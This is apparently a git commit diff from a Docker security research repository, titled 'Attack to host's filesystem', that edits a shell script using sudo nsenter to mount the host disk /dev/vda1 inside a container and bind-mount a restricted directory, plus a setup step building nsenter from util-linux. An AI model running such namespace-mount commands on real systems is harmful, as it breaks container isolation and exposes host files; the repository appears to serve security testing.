2888b4e578588fc4986ba6b399751d022492c873
Ubuntu <ubuntu@docker-security18.novalocal>
2018-12-06 01:24:57 +0000

    Attack to host's filesystem

--- Attacks/Hosts_fs/host_side_part2_v123.sh
+++ Attacks/Hosts_fs/host_side_part2_v123.sh
@@ -6,9 +6,9 @@ docker inspect --format {{.State.Pid}} ${container_id} > PID
 container_pid=$(cat PID)
 sudo nsenter --target ${container_pid} --mount --uts --ipc --net --pid -- mount /dev/vda1 /tmpmount
 
-#I can doo mkdir and mknod with nsenter too -> version 4
+#I can do mkdir and mknod with nsenter too -> version 4
 
 #Version 3
-#sudo nsenter --target ${container_pid} --mount --uts --ipc --net --pid -- mount -o bind /tmpmount/home/ubuntu/Security-on-Docker/Docker_tests/mount/attack_host_to_container/restricted_area /doot
+sudo nsenter --target ${container_pid} --mount --uts --ipc --net --pid -- mount -o bind /tmpmount/home/ubuntu/Security-on-Docker/Attacks/Hosts_fs/restricted_area /doot
 
 sudo nsenter --target ${container_pid} --mount --uts --ipc --net --pid -- umount /tmpmount
--- requirements.sh
+++ requirements.sh
@@ -14,3 +14,22 @@ sudo apt-get install apparmor-utils
 
 #Install python
 sudo apt-get install python
+
+#Install nsenter with a trick
+echo "#On docker container" > nsenter_trick_docker
+echo "apt-get update" >> nsenter_trick_docker
+echo "apt-get install git build-essential libncurses5-dev libslang2-dev gettext zlib1g-dev libselinux1-dev debhelper lsb-release pkg-config po-debconf autoconf automake autopoint libtool" >> nsenter_trick_docker
+echo "git clone git://git.kernel.org/pub/scm/utils/util-linux/util-linux.git util-linux" >> nsenter_trick_docker
+echo "cd util-linux/" >> nsenter_trick_docker
+echo "./autogen.sh" >> nsenter_trick_docker
+echo "./configure --without-python --disable-all-programs --enable-nsenter" >> nsenter_trick_docker
+echo "make" >> nsenter_trick_docker
+
+echo "## from different shell - on the host" > nsenter_trick_host.sh
+echo "docker cp nsenter:/util-linux/nsenter /usr/local/bin/" >> nsenter_trick_host.sh
+echo "docker cp nsenter:/util-linux/bash-completion/nsenter /etc/bash_completion.d/nsenter" >> nsenter_trick_host.sh
+sudo chmod 777 nsenter_trick_host.sh
+
+docker run --name nsenter -it ubuntu:14.04 bash
+
+
